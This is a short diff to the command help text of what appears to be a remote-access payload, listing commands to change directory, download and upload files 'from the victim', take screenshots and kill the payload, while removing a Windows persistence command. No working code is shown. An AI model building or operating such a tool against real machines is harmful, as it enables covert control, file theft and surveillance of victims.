@@ -3,6 +3,5 @@ cd <directory> - Change current directory
 pwd - Print working directory
 download <file_path> - Download a file from the victim
 upload <file_path> - Upload a file to the victim
-screenshot - Take a screenshot
-persist - Install persistence (Windows only)
+screenshot - Take a screenshot and save to controller's Downloads
 terminate - Kill the payload process
